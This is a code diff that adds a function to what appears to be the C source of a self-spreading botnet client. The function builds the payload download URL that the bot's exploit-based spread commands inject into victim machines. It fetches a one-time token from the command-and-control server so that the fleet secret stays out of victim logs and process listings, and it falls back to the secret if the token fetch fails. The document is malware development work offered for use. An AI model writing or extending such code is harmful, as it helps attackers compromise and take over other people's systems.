@@ -1032,6 +1032,60 @@ int http_get_url(notnet_bot_t *bot, const char *url, char *buf, int len) {
     return total;
 }
 
+/* #190: build the payload drop URL used by CVE/LOTL spread commands.
+ *
+ * The busybox wget on the VICTIM cannot authenticate, so the fleet secret
+ * must never appear in the drop URL — it would land in the injected shell
+ * command (ps / /proc cmdline), the exploit request body, and victim logs
+ * (CWE-200). Instead the bot first fetches a short-TTL ONE-TIME download
+ * token from the C2 (GET /bot/token; http_get_url appends ?secret= so the
+ * token endpoint itself stays fleet-authenticated) and puts THAT in the
+ * URL: /bot/notnet?token=<tok>. The C2 consumes the token on first use.
+ * If the token fetch fails (older C2, offline lab), fall back to the
+ * legacy ?secret= form so drops still work.
+ * Returns 0 when a token URL was built, 1 on fallback; dl_url is always
+ * populated (or empty on hard failure). */
+int build_drop_url(notnet_bot_t *bot, char *dl_url, size_t sz) {
+    if (!bot || !dl_url || sz == 0) return -1;
+    dl_url[0] = '\0';
+    int n = snprintf(dl_url, sz, "http://%.250s:%d/bot/notnet",
+                     bot->c2_http.server, PAYLOAD_DL_PORT);
+    if (n < 0 || (size_t)n >= sz) return -1;
+
+    char tok_url[512];
+    if (snprintf(tok_url, sizeof(tok_url), "http://%.250s:%d/bot/token",
+                 bot->c2_http.server, PAYLOAD_DL_PORT) < 0)
+        goto fallback;
+    char resp[1024];
+    if (http_get_url(bot, tok_url, resp, sizeof(resp)) > 0) {
+        const char *body = strstr(resp, "\r\n\r\n");
+        char tok[128];
+        if (body && json_find_string(body + 4, "token", tok, sizeof(tok)) &&
+            tok[0] != '\0') {
+            char q[192];
+            int qlen = snprintf(q, sizeof(q), "?token=%s", tok);
+            if (qlen > 0 && (size_t)qlen < sizeof(q) &&
+                n + (size_t)qlen < sz) {
+                memcpy(dl_url + n, q, (size_t)qlen + 1);
+                return 0;
+            }
+        }
+    }
+fallback:
+    log_warn("SPREAD: drop-token fetch failed, falling back to ?secret= (#190)");
+    {
+        char q[256];
+        int qlen = snprintf(q, sizeof(q), "?secret=%s", bot->secret);
+        if (qlen > 0 && (size_t)qlen < sizeof(q) && n + (size_t)qlen < sz) {
+            memcpy(dl_url + n, q, (size_t)qlen + 1);
+            return 1;
+        }
+    }
+    dl_url[n] = '\0';
+    return -1;
+}
+
+
 int http_read(notnet_bot_t *bot, char *buf, int len) {
     if (!bot->c2_http.connected) return -1;
     
